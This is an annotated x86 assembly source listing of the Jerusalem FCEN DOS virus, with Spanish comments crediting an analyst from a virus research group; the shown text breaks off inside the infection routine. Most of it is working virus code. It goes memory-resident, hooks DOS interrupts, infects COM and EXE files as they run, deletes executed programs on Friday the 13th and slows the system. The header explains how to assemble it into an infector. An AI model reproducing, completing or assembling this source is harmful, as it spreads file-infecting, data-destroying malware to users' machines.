

PAGE  80,132

; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
; ÛÛ                                                                                          ÛÛ
; ÛÛ                                 JERUSALEM FCEN                                           ÛÛ
; ÛÛ                                                                                          ÛÛ
; ÛÛ Analizo : Jose Luis Campanello (Grupo de Investigacion en Seguridad y Virus Informatico) ÛÛ
; ÛÛ Fuente  : 8-6-91 (dd-mm-aa)/(dd-mm-yy)                                                   ÛÛ
; ÛÛ                                                                                          ÛÛ
; ÛÛ Creado  : 1987 (dia no conocido)                                                         ÛÛ
; ÛÛ Origen  : Desconocido                                                                    ÛÛ
; ÛÛ                                                                                          ÛÛ
; ÛÛ El fuente debe ensamblarse y luego generar un .COM que solo instalara el virus en        ÛÛ
; ÛÛ memoria. El programa infectado no hace nada (solo termina) y fue agregado para generar   ÛÛ
; ÛÛ un infector para este virus. Los 5 ultimos bytes del programa COM final contienen el     ÛÛ
; ÛÛ VIRUS ID para que este programa no vuelva a ser infectado.                               ÛÛ
; ÛÛ En los EXE, el VIRUS ID no es grabado (los EXE pueden ser infectados un numero no        ÛÛ
; ÛÛ conocido de veces. El VIRUS ID es 'sUMsDos' (aunque el virus usa solamente 'MsDos' para  ÛÛ
; ÛÛ reconocerse). El COMMAND.COM ***NO*** es infectado.                                      ÛÛ
; ÛÛ                                                                                          ÛÛ
; ÛÛ Infeccion de COMs : Si el programa no esta infectado (VIRUS ID en los ultimos 5 bytes)   ÛÛ
; ÛÛ                     pide 64 Kb de memoria al DOS y copia el VIRUS al buffer. Luego carga ÛÛ
; ÛÛ                     el resto del programa en el buffer (si long del programa +           ÛÛ
; ÛÛ                     long virus > 64 Kb, el programa queda incompleto) y graba el buffer  ÛÛ
; ÛÛ                     (virus y programa). Finalmente graba el VIRUS ID al final del        ÛÛ
; ÛÛ                     programa y lo ejecuta.                                               ÛÛ
; ÛÛ Infeccion de EXEs : Si el programa no esta infectado (nunca lo esta), lee su header y    ÛÛ
; ÛÛ                     cambia su punto de entrada y stack (que conserva en sus datos) y los ÛÛ
; ÛÛ                     pone apuntando al codigo del VIRUS (ver rutina VIRUS) que copia al   ÛÛ
; ÛÛ                     final del EXE.                                                       ÛÛ
; ÛÛ                                                                                          ÛÛ
; ÛÛ El VIRUS ocupa menos espacio en memoria -0600h sin PSP- que en disco -0710h sin PSP- ).  ÛÛ
; ÛÛ                                                                                          ÛÛ
; ÛÛ Efectos del VIRUS : - Si el a¤o es 1987, solo infecta nuevos programas. Es muy posible   ÛÛ
; ÛÛ                       que 1987 sea el a¤o de creacion del virus y se eligio retrazar su  ÛÛ
; ÛÛ                       activacion hasta 1988 para asegurar su amplia distribucion.        ÛÛ
; ÛÛ                     - Si es VIERNES 13, todos los programas que se ordena ejecutar con   ÛÛ
; ÛÛ                       la INT 21 FUNC 4B00 son borrados antes de pasar el control al DOS  ÛÛ
; ÛÛ                       para su ejecucion.                                                 ÛÛ
; ÛÛ                     - Si NO es VIERNES 13, infecta programas y espera 30 minutos antes   ÛÛ
; ÛÛ                       de hacer un SCROOL UP de 2 lineas en una ventana que va desde      ÛÛ
; ÛÛ                       (5,5) a (16,16) y luego de esto, con cada interrupcion de reloj    ÛÛ
; ÛÛ                       hace una lectura de 16 Kb para ralentizar el sistema en un factor  ÛÛ
; ÛÛ                       de **************************************************************  ÛÛ
; ÛÛ                                                                                          ÛÛ
; ÛÛ El virus tiene una funcion sofisticada que permite copiar cualquier cantidad de bytes    ÛÛ
; ÛÛ ( > 64 Kb ) hacia una direccion absoluta menor y retornar con nuevos CS:IP y SS:SP. Esta ÛÛ
; ÛÛ funcion nunca es usada por el virus. Originalmente, la idea del programador debio haber  ÛÛ
; ÛÛ sido poner el codigo del virus entre el header-tabla-de-reubicaciones del EXE y su       ÛÛ
; ÛÛ codigo, aunque esta funcion puede ser herencia de otras versiones de Jerusalem o Suriv.  ÛÛ
; ÛÛ                                                                                          ÛÛ
; ÛÛ Remocion : Standard para un Jerusalem Virus Family Member                                ÛÛ
; ÛÛ                                                                                          ÛÛ
; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

parag_PSP       equ     0100h / 16                              ; cantidad de paragraphs del PSP
VIERNES         equ     05h                                     ; codigo de dia del viernes


seg_extra       segment at 0000h
                assume  cs:seg_extra, ds:nothing, es:nothing, ss:nothing


                org     03FCh

rut_copia       proc    far                                     ; cuando se instale el virus, va a
tbint_offFFh    dw      ?                                       ; Ä¿ direccion del puntero a la
tbint_segFFh    db      ?                                       ; ÄÙ int FF en la tb de ints
rut_copia       endp                                            ; haber una rutina que copia mem

seg_extra       ends



_codeseg        segment
                assume  cs:_codeseg, ds:_codeseg, es:_codeseg, ss:_codeseg


                org     002Ch

seg_envblock    dw      ?                                       ; segmento del environment block
max_envblock    equ     7FFFh                                   ; longitud maxima del env block


                org     005Ch
FCB1            db      ?                                       ; FCB1 del huesped


                org     006Ch
FCB2            db      ?                                       ; FCB2 del huesped


                org     0080h
COMM_LINE       db      80h dup (?)                             ; linea de comandos del huesped


                org     100h

jerufcen        proc    far

start:
                jmp     inicio


long_virus      =       offset inicio_huesped-offset start
_tope_stack     =       offset _stack_extra-offset start
_tope_stack_xtr =       offset inicio_huesped-offset start
longparte_resid =       offset inicio_huesped-offset start


VIRUS_IDEXPAND  db      'sU'                                    ; el VIRUS ID completo es 'sUMsDos'
                                                                ; el 'sU' esta posiblemente
                                                                ; relacionado con el 'sURIV'
                                                                ; (ID del Suriv 3.0)
VIRUS_ID        db      'MsDos'                                 ; identificador del virus
long_VIRUS_ID   equ     $-offset VIRUS_ID
ip_funcDD       dw      ?                                       ; Ä¿ cs:ip usados para retornar al
cs_funcDD       dw      ?                                       ; ÄÙ pgm luego de sacar el virus
VIRUS_borrarpgm db      00h                                     ; indica si esta activo (01)
FCBini_funcDD   dw      0000h                                   ; descriptor de FCB que pasa el DOS
                                                                ; a cada programa cuando comienza
long_huesped    dw      offset HUESPED_INFEC-offset inicio_huesped ; longitud del programa original
offvie_int08h   dw      ?                                       ; Ä¿ puntero de la
segvie_int08h   dw      ?                                       ; ÄÙ vieja int 08h
offvie_int21h   dw      ?                                       ; Ä¿ puntero de la
segvie_int21h   dw      ?                                       ; ÄÙ vieja int 21h
infec_offint24h dw      ?                                       ; Ä¿ puntero de la
infec_segint24h dw      ?                                       ; ÄÙ vieja int 24h
molestia        dw      0000h                                   ; indica la cantidad de ints 08
                                                                ; que faltan para que el virus
                                                                ; comienze a molestar (si faltan
                                                                ; 2, hace un scrool; si falta 1,
                                                                ; pierde tiempo
clean_parameter dw      8 dup (0000h)                           ; tabla pasada por el virus para
                                                                ; que el residente lo saque del
                                                                ; huesped. Esta tabla tiene la
                                                                ; siguiente forma:
                                                                ;
                                                                ; byte uso
                                                                ; 00 w drv specifiers (FCBs valids)
                                                                ; 02 d cs:ip del huesped
                                                                ; 06 d ss:sp del huesped
                                                                ; 0A w # of bytes a borrar (debe
                                                                ;      ser multiplo de 16)
                                                                ; 0C w # de bytes luego del ultimo
                                                                ;      blk de 64Kb completos
                                                                ; 0E w # de blks de 64Kb completos
seg_virus       dw      ?                                       ; segmento del virus
virus_parag     dw      ?                                       ; longitud en paragraphs del virus

; lo siguiente es un parameter block para la ejecucion de un huesped
paramblock      dw      0000h                                   ; usar el env del virus
                dw      offset COMM_LINE                        ; Ä¿ puntero a la
parblk_segCOMLI dw      ?                                       ; ÄÙ linea de comandos
                dw      offset FCB1                             ; Ä¿ puntero al
parblk_segFCB1  dw      ?                                       ; ÄÙ FCB1
                dw      offset FCB2                             ; Ä¿ puntero al
parblk_segFCB2  dw      ?                                       ; ÄÙ FCB2
infec_spEXEhead dw      ?                                       ; Ä¿ copia del ss:sp
infec_ssEXEhead dw      ?                                       ; ÄÙ del viejo EXE
infec_ipEXEhead dw      ?                                       ; Ä¿ copia del cs:ip
infec_csEXEhead dw      ?                                       ; ÄÙ del viejo EXE
offvie_intFFh   dw      ?                                       ; Ä¿ low seg:desp del
lowsegvi_intFFh db      ?                                       ; ÄÙ punt a la int FFh
                                                                ;  xref 75DA:18AA
infec_esCOM     db      00h                                     ; indica si el arch a infectar
                                                                ; es COM (00) o EXE (01)
infec_EXEhead   dw      14 dup (?)                              ; buffer para el header del EXE
long_header     equ     size infec_EXEhead                      ; longitud del header del EXE
infec_buffvirid db      5 dup (?)                               ; buffer usado para leer los 5
                                                                ; ultimos bytes del archivo a infec
infec_fhandle   dw      0FFFFh                                  ; file handle usado en la infeccion
infec_atrib     dw      ?                                       ; atributos del arch a infectar
infec_fdate     dw      ?                                       ; fecha de creacion (para infec)
infec_ftime     dw      ?                                       ; hora de creacion (para infec)
infec_longpag   dw      0200h                                   ; longitud de la pagina de un EXE
infec_longparag dw      0010h                                   ; longitud de un paragrafo
infec_longEXE   dd      ?                                       ; longitud en bytes del EXE
                                                                ; (redondeada a un multiplo de 16)
infec_off_fname dw      ?                                       ; Ä¿ puntero al file name usado
infec_seg_fname dw      ?                                       ; ÄÙ para infectar (func 4B00)
command         db      'COMMAND.COM'                           ; no infecta el COMMAND.COM

long_command    equ     $-offset command                        ; long del nombre 'COMMAND.COM'

infec_pidiomem  dw      0000h                                   ; si es 0001 => pidio mem en infec
                db      00h, 00h, 00h, 00h


inicio:
                cld                                             ; incremento de direcciones
                mov     ah,0E0h                                 ; Ä¿ la funcion E0 no esta definida
                int     21h                                     ;  ³ a menos que el virus ya este
                                                                ; ÄÙ activo y residente en memoria
                cmp     ah,0E0h                                 ; Ä¿ si el codigo retornado
                jae     loc_3                                   ;  ³ es menor a 03 o
                cmp     ah,03h                                  ;  ³ mayor o igual a E0
                jb      loc_3                                   ; ÄÙ => loc_3 (virus no residente)
                mov     ah,0DDh                                 ; ah = DD (definida si el virus
                                                                ;      ya esta residente. copia
                                                                ;      cx bytes de memoria desde
                                                                ;      SI a DI y retorna a CS:0100
                                                                ;      del que la llamo
                mov     di,offset start                         ; di = direccion destino
                mov     si,long_virus                           ; Ä¿ si = direccion fuente
                add     si,di                                   ; ÄÙ      (long virus + psp)
                mov     cx,cs:[di+long_huesped-offset start]    ; cx = long del pgm infectado
                nop                                             ; para completar la direccion
                                                                ; (que en el virus es de 16 bits
                                                                ; y el ensamblador deja de 8 bits
                                                                ; entonces, para que las direcciones
                                                                ; queden con el mismo valor)
                int     21h                                     ; copia el huesped y lo ejecuta
loc_3:
                mov     ax,cs                                   ; Ä¿
                add     ax,parag_PSP                            ;  ³ ss:sp = cs+0010:0700
                mov     ss,ax                                   ;  ³         (saltea el PSP)
                mov     sp,_tope_stack                          ; ÄÙ
                push    ax                                      ; Ä¿ pone como direccion de
                mov     ax,offset VIRUS-offset start            ;  ³ retorno (FAR) el rotulo
                push    ax                                      ; ÄÙ VIRUS (cs = cs + 0010)
                ret                                             ; Return far
jerufcen        endp

VIRUS           proc    far
                cld                                             ; incremento de direcciones
                push    es                                      ; salva es
                mov     cs:[seg_virus-offset start],es          ; guarda el segmento del virus
                mov     cs:[parblk_segCOMLI-offset start],es    ; Ä¿ completa los segmentos
                mov     cs:[parblk_segFCB1-offset start],es     ;  ³ del parameter block para
                mov     cs:[parblk_segFCB2-offset start],es     ; ÄÙ la ejecucion del huesped
                mov     ax,es                                   ; Ä¿ corrige el cs y ss por si
                add     ax,parag_PSP                            ;  ³ fue un EXE (el codigo debe
                add     cs:[infec_csEXEhead-offset start],ax    ;  ³ ser relativo a cero)
                add     cs:[infec_ssEXEhead-offset start],ax    ; ÄÙ
                mov     ah,0E0h                                 ; Ä¿ ve si el virus ya
                int     21h                                     ; ÄÙ esta residente
                cmp     ah,0E0h                                 ; Ä¿ si ah ò E0 (virus no en MEM)
                jae     instala_virus                           ; ÄÙ => instala el virus
                cmp     ah,03h                                  ; *********************************
                pop     es                                      ; restaura es
                mov     ss,cs:[infec_ssEXEhead-offset start]    ; Ä¿ ss:sp = ss:sp (que habia en
                mov     sp,cs:[infec_spEXEhead-offset start]    ; ÄÙ         el header del EXE)
                jmp     dword ptr cs:[infec_ipEXEhead-offset start] ; => al cs:ip del EXE header
instala_virus:
                assume  es: seg_extra
                xor     ax,ax                                   ; Ä¿ es = 0000 (segmento de
                mov     es,ax                                   ; ÄÙ            interrupciones)
                mov     ax,es:[tbint_offFFh]                    ; Ä¿
                mov     cs:[offvie_intFFh-offset start],ax      ;  ³ guarda los 3 primeros bytes
                mov     al,es:[tbint_segFFh]                    ;  ³ del punt a la int FF
                mov     cs:[lowsegvi_intFFh-offset start],al    ; ÄÙ
                mov     word ptr es:[tbint_offFFh],0A5F3h       ; Ä¿ pone :  F3/A5 repz movsw
                mov     byte ptr es:[tbint_segFFh],0CBh         ;  ³         CB    retf
                                                                ;  ³
                                                                ;  ³ en 0000:03FC (donde esta el
                                                                ; ÄÙ            punt a la int FF)
                pop     ax                                      ; Ä¿
                add     ax,0010h                                ;  ³ es = es (punt al PSP) + 0010h
                mov     es,ax                                   ; ÄÙ      (es = puntero al codigo)
                push    cs                                      ; Ä¿ ds = cs
                pop     ds                                      ; ÄÙ
                mov     cx,long_virus                           ; Ä¿ cx = long_virus / 2
                shr     cx,1                                    ; ÄÙ      (# words a mover)
                xor     si,si                                   ; si = 0000 Ä¿ aparentemente copia
                mov     di,si                                   ; di = 0000 ÄÙ sobre el mismo lugar
                push    es                                      ; Ä¿ salva la direccion de retorno
                mov     ax,offset ya_se_movio-offset start      ;  ³ de la rutina de copia
                push    ax                                      ; ÄÙ (es:ya_se_movio-offset start)
                assume  es: _codeseg
                jmp     seg_extra:rut_copia                     ; copia el virus (si es EXE
                                                                ; lo pone luego del PSP)
ya_se_movio:
                assume  ds:seg_extra
                mov     ax,cs                                   ; Ä¿
                mov     ss,ax                                   ;  ³ ss:sp = cs:_tope_stack
                mov     sp,_tope_stack                          ; ÄÙ
                xor     ax,ax                                   ; Ä¿ ds = 0000
                mov     ds,ax                                   ; ÄÙ
                mov     ax,cs:[offvie_intFFh-offset start]      ; Ä¿
                mov     ds:[tbint_offFFh],ax                    ;  ³ restaura los 3 bytes
                mov     al,cs:[lowsegvi_intFFh-offset start]    ;  ³ del punt a la int FF
                mov     ds:[tbint_segFFh],al                    ; ÄÙ
                mov     bx,sp                                   ; Ä¿
                mov     cl,04h                                  ;  ³ bx = sp / 16 + parag_PSP
                shr     bx,cl                                   ;  ³ (long en parag del virus
                add     bx,10h                                  ; ÄÙ  para reducir el bloque)
                mov     cs:[virus_parag-offset start],bx        ; pone la longitud en par
                mov     ah,4Ah                                  ; ah = cambiar long del bloque
                mov     es,cs:[seg_virus-offset start]          ; es = seg del virus
                int     21h                                     ; Ä¿ achica el bloque al
                                                                ; ÄÙ tama¤o del virus
                mov     ax,3521h                                ; Ä¿ es:bx = puntero de la
                int     21h                                     ; ÄÙ         int 21h
                mov     cs:[offvie_int21h-offset start],bx      ; Ä¿ salva la direccion
                mov     cs:[segvie_int21h-offset start],es      ; ÄÙ de la int 21h
                assume  ds: _codeseg
                push    cs                                      ; Ä¿
                pop     ds                                      ;  ³ pone la int 21 en
                mov     dx,offset int21h-offset start           ;  ³ int21h (parte del VIRUS)
                mov     ax,2521h                                ;  ³
                int     21h                                     ; ÄÙ
                mov     es,ds:[seg_virus-offset start]          ; Ä¿ es = seg del environment
                mov     es,es:[seg_envblock]                    ; ÄÙ      block
                xor     di,di                                   ; di = punt al comienzo del env blk
                mov     cx,max_envblock                         ; maxima long del env blk
                xor     al,al                                   ; al = 00 (busca un 00 00)
locloop_4:                                                      ; Ä¿
                repne   scasb                                   ;  ³ busca el fin del env blk
                cmp     es:[di],al                              ;  ³ para obtener el pgm name
                loopnz  locloop_4                               ; ÄÙ
                mov     dx,di                                   ; dx = di (punt al pgm name)
                add     dx,03h                                  ; dx + 3 (salta el 00 y extra cnt)
                                                                ; (en el env blk estan las cadenas
                                                                ; de entorno -ASCIIZ- que terminan
                                                                ; con una cadena nula -00-, luego
                                                                ; esta la cant de param extra -2
                                                                ; bytes- y luego el pgm name
                                                                ; completo de invocacion)
                mov     ax,4B00h                                ; ax = cargar y ejecutar pgm
                push    es                                      ; Ä¿ ds = es
                pop     ds                                      ; ÄÙ
                push    cs                                      ; Ä¿
                pop     es                                      ;  ³ es:bx = puntero al param blk
                mov     bx,offset paramblock-offset start       ; ÄÙ
                push    ds                                      ; Ä¿
                push    es                                      ;  ³
                push    ax                                      ;  ³ salva ds, es, ax, bx, cx, dx
                push    bx                                      ;  ³
                push    cx                                      ;  ³
                push    dx                                      ; ÄÙ
                mov     ah,2Ah                                  ; Ä¿ obtiene la fecha actual
                int     21h                                     ;  ³ (cx=a¤o, dh=mes, dl=dia,
                                                                ; ÄÙ  al=dia de la sem)
                mov     byte ptr cs:[VIRUS_borrarpgm-offset start],00h ; asume que no debe borrar pgms
                cmp     cx,1987                                 ; Ä¿ si es 1987
                je      loc_6                                   ; ÄÙ => loc_6 (no se activa)
                cmp     al,VIERNES                              ; Ä¿
                jne     loc_5                                   ;  ³ si no es VIERNES 13
                cmp     dl,13                                   ;  ³ => loc_5 (no borra pgms)
                jne     loc_5                                   ; ÄÙ
                inc     byte ptr cs:[VIRUS_borrarpgm-offset start] ; indica que debe borrar pgms
                jmp     short loc_6                             ; => loc_6 (ejec el huesped)
                nop
loc_5:
                mov     ax,3508h                                ; Ä¿
                int     21h                                     ;  ³ salva el puntero de
                mov     cs:[offvie_int08h-offset start],bx      ;  ³ la vieja int 08
                mov     cs:[segvie_int08h-offset start],es      ; ÄÙ
                push    cs                                      ; Ä¿ ds = cs
                pop     ds                                      ; ÄÙ
                mov     word ptr ds:[molestia-offset start],7E90h ; indica esperar 30 min antes
                                                                  ; de comenzar a molestar
                mov     ax,2508h                                ; Ä¿ pone el puntero de la
                mov     dx,offset int08h-offset start           ;  ³ int 08 en cs:int08h-off start
                int     21h                                     ; ÄÙ
loc_6:
                pop     dx                                      ; Ä¿
                pop     cx                                      ;  ³
                pop     bx                                      ;  ³ restaura dx, cx, bx,
                pop     ax                                      ;  ³          ax, es, ds
                pop     es                                      ;  ³
                pop     ds                                      ; ÄÙ
                pushf                                           ; Ä¿ simula una INT 21
                call    dword ptr cs:[offvie_int21h-offset start] ; ÄÙ (ejecuta el pgm huesped)
                push    ds                                      ; Ä¿ es = ds (segmento del env blk)
                pop     es                                      ; ÄÙ
                mov     ah,49h                                  ; Ä¿ libera el env block
                int     21h                                     ; ÄÙ (del virus)
                mov     ah,4Dh                                  ; Ä¿ obtiene el codigo de
                int     21h                                     ; ÄÙ retorno del huesped
                mov     ah,31h                                  ; ah = 31 (quedar residente)
                mov     dx,longparte_resid                      ; Ä¿
                mov     cl,04h                                  ;  ³ dx = long residente / 16
                shr     dx,cl                                   ;  ³      + 10h (PSP)
                add     dx,10h                                  ; ÄÙ
                int     21h                                     ; queda residente
VIRUS           endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
; ÛÛ                                                                                          ÛÛ
; ÛÛ                    interrupcion 24h del virus                                           ÛÛ
; ÛÛ                                                                                          ÛÛ
; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

int24h          proc    far
                xor     al,al                                   ; indica ignorar
                iret
int24h          endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
; ÛÛ                                                                                          ÛÛ
; ÛÛ                    interrupcion 08h del virus                                            ÛÛ
; ÛÛ                                                                                          ÛÛ
; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

int08h          proc    far
                cmp     word ptr CS:[molestia-offset start],0002h ; Ä¿ si no indica scrool
                jnz     loc_12                                    ; ÄÙ => loc_12 (pierde tiempo)
                push    ax                                      ; Ä¿
                push    bx                                      ;  ³
                push    cx                                      ;  ³ salva ax, bx, cx, dx, bp
                push    dx                                      ;  ³
                push    bp                                      ; ÄÙ
                mov     ax,0602h                                ; Ä¿ hace un scrool up de la
                mov     bh,87h                                  ;  ³ (5,5) a la (16,16) y
                mov     cx,0505h                                ;  ³ las nuevas lineas las
                mov     dx,1010h                                ;  ³ pone blinking
                int     10h                                     ; ÄÙ
                pop     bp                                      ; Ä¿
                pop     dx                                      ;  ³
                pop     cx                                      ;  ³ restaura bp, dx, cx, bx, ax
                pop     bx                                      ;  ³
                pop     ax                                      ; ÄÙ
loc_12:
                dec     word ptr cs:[molestia-offset start]     ; Ä¿ decrementa el counter (espera
                                                                ;  ³ 29 min 40 seg antes de
                                                                ;  ³ ralentizar la maquina)
                jnz     sale_int08h                             ;  ³ si no termino la espera
                                                                ; ÄÙ => vieja int 08
                mov     word ptr cs:[molestia-offset start],0001h ; perder tiempo en la prox int 08
                push    ax                                      ; Ä¿
                push    cx                                      ;  ³ salva ax, cx, si
                push    si                                      ; ÄÙ
                mov     cx,4001h                                ; Ä¿ pierde tiempo
                repz    lodsb                                   ; ÄÙ (lee 16 Kb
                pop     si                                      ; Ä¿
                pop     cx                                      ;  ³ restaura si, cx, ax
                pop     ax                                      ; ÄÙ
sale_int08h:
                jmp     dword ptr cs:[offvie_int08h-offset start] ; ejecuta la vieja int 08
int08h          endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
; ÛÛ                                                                                          ÛÛ
; ÛÛ                    interrupcion 21h del virus                                            ÛÛ
; ÛÛ                                                                                          ÛÛ
; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

int21h          proc    far
                pushf                                           ; salva los flags
                cmp     ah,0E0h                                 ; Ä¿ si no es funcion E0 (virus ac)
                jnz     loc_8                                   ; ÄÙ => loc_1extra (ve las otras)
                mov     ax,0300h                                ; ax = 0300 ("estoy", CF = 0 -OK-)
                popf                                            ; restaura los flags
                iret                                            ; y retorna
loc_8:          cmp     ah,0DDh                                 ; Ä¿ si es funcion DD (sys infec)
                jz      funcDD_int21h                           ; ÄÙ => mueve el huesped
                cmp     ah,0DEh                                 ; Ä¿ funcion DE ? (limpiar huesped)
                jz      funcDE_int21h                           ; ÄÙ => sacar virus de mem
                cmp     ax,4B00h                                ; Ä¿ si es funcion 4B00 (exec)
                jnz     no_es_func_virus                        ;  ³ => infectar
                jmp     infectar                                ; ÄÙ
no_es_func_virus:
                popf                                            ; restaura los flags
                jmp     dword ptr cs:[offvie_int21h-offset start] ; ejecuta la vieja int 21h
funcDD_int21h:
                pop     ax                                      ; borra los flags (que guard¢)
                pop     ax                                      ; borra el ip del llamador
                mov     ax,offset start                         ; Ä¿ guarda la direccion donde
                mov     cs:[ip_funcDD-offset start],ax          ;  ³ comienza el huesped
                pop     ax                                      ;  ³ (luego de sacar el virus)
                mov     cs:[cs_funcDD-offset start],ax          ; ÄÙ
                rep     movsb                                   ; borra el virus de memoria
                popf                                            ; borra los flags (del INT 21h)
                mov     ax,cs:[FCBini_funcDD-offset start]      ; ax = valor de FCB validos (DOS)
                jmp     dword ptr cs:[ip_funcDD-offset start]   ; RETORNA AL HUESPED
funcDE_int21h:
                add     sp,0006h                                ; borra flags (que salvo), ip y cs
                popf                                            ; saca los flags (al hacer INT 21)
                mov     ax,cs                                   ; Ä¿
                mov     ss,ax                                   ;  ³ ss:sp = cs:stack de residente
                mov     sp,_tope_stack_xtr                      ; ÄÙ
                push    es                                      ; salva es
                push    es                                      ; salva es
                xor     di,di                                   ; di = 0000
                push    cs                                      ; Ä¿ cs = es
                pop     es                                      ; ÄÙ
                mov     cx,length clean_parameter               ; cx = long del param para limpiar
                mov     si,bx                                   ; ds:si = puntero a la tb param
                mov     di,offset clean_parameter-offset start  ; es:di = puntero al buff de param
                rep     movsb                                   ; copia la tb de param para limpiar
                mov     ax,ds                                   ; Ä¿ es = ds (del virus a remover)
                mov     es,ax                                   ; ÄÙ
                mul     word ptr cs:[infec_longparag-offset start] ; dx.ax = nro de byte del virus
                add     ax,cs:[clean_parameter-offset start+0Ah] ; Ä¿ dx.ax + long del virus
                adc     dx,0000h                                 ; ÄÙ (comienzo del pgm infectado)
                div     word ptr cs:[infec_longparag-offset start] ; ax = seg pgm, dx = off pgm infec
                mov     ds,ax                                   ; Ä¿ ds:si = ax:dx (bytes del pgm
                mov     si,dx                                   ; ÄÙ                infectado)
                mov     di,dx                                   ; di = destino (long del virus
                                                                ;      (debe ser multiplo de 16 b)
                mov     bp,es                                   ; bp = es (aux para el seg)
                mov     bx,cs:[clean_parameter-offset start+0Eh] ; bx = # blks de 64 Kb a mover
                or      bx,bx                                   ; Ä¿ si no hay uno completo
                jz      loc_11                                  ; ÄÙ => loc_11 (mueve el fragmento)
loc_10:
                mov     cx,8000h                                ; Ä¿ copia un bloque de 64 Kb
                rep     movsw                                   ; ÄÙ
                add     ax,1000h                                ; ax + 64 Kb
                add     bp,1000h                                ; bp + 64 Kb
                mov     ds,ax                                   ; ds = seg del prox blk fuente
                mov     es,bp                                   ; es = seg del prox blk destino
                dec     bx                                      ; Ä¿ si quedan bloques
                jnz     loc_10                                  ; ÄÙ => loc_10 (itera)
loc_11:
                mov     cx,cs:[clean_parameter-offset start+0Ch] ; Ä¿ copia el fragmento
                rep     movsb                                    ; ÄÙ del final del huesped
                pop     ax                                      ; Ä¿ ax = base segment del pgm
                push    ax                                      ;  ³      (debe reubicar el EXE)
                add     ax,0010h                                ; ÄÙ
                add     cs:[clean_parameter-offset start+08h],ax ; Ä¿ reubica el cs y ss del huesped
                add     cs:[clean_parameter-offset start+04h],ax ; ÄÙ en el segmento base que tienen
                mov     ax,cs:[clean_parameter-offset start+00h] ; ax = drv specifiers (FCB valids)
                pop     ds                                      ; Ä¿ ds = es = PSP
                pop     es                                      ; ÄÙ
                mov     ss,cs:[clean_parameter-offset start+08h] ; Ä¿ ss:sp = stack del huesped
                mov     sp,cs:[clean_parameter-offset start+06h] ; ÄÙ
                jmp     dword ptr cs:[clean_parameter-offset start+02h] ; => salta al huesped
borrar_y_ejec:
                xor     cx,cx                                   ; Ä¿ pone el archivo con
                mov     ax,4301h                                ;  ³ atributos normales
                int     21h                                     ; ÄÙ
                mov     ah,41h                                  ; Ä¿ borra el archivo
                int     21h                                     ; ÄÙ
                mov     ax,4B00h                                ; ax = cargar y ejecutar
                popf                                            ; saca los flags
                jmp     dword ptr cs:[offvie_int21h-offset start] ; salta a la int 21 vieja
infectar:
                cmp     byte ptr cs:[VIRUS_borrarpgm-offset start],01h ; Ä¿ si debe borrar archs
                je      borrar_y_ejec                                  ; ÄÙ => borra el arch y ejecuta
                mov     word ptr cs:[infec_fhandle-offset start],0FFFFh ; marca no hay arch abierto
                mov     word ptr cs:[infec_pidiomem-offset start],0000h ; marca no pidio memoria
                mov     cs:[infec_off_fname-offset start],dx    ; Ä¿ guarda el puntero
                mov     cs:[infec_seg_fname-offset start],ds    ; ÄÙ al fname a ejecutar
                push    ax                                      ; Ä¿
                push    bx                                      ;  ³
                push    cx                                      ;  ³ salva
                push    dx                                      ;  ³ los
                push    si                                      ;  ³ registros
                push    di                                      ;  ³
                push    ds                                      ;  ³
                push    es                                      ; ÄÙ
                cld                                             ; incrementa las direcciones
                mov     di,dx                                   ; di = dx (offset fname)
                xor     dl,dl                                   ; dl = 00
                cmp     byte ptr [di+1],3Ah                     ; Ä¿ si no especifica 'd:'
                jne     loc_14                                  ; ÄÙ => loc_14 (usar drive actual)
                mov     dl,[di]                                 ; Ä¿ dl = # de drive indicado
                and     dl,1Fh                                  ; ÄÙ
loc_14:
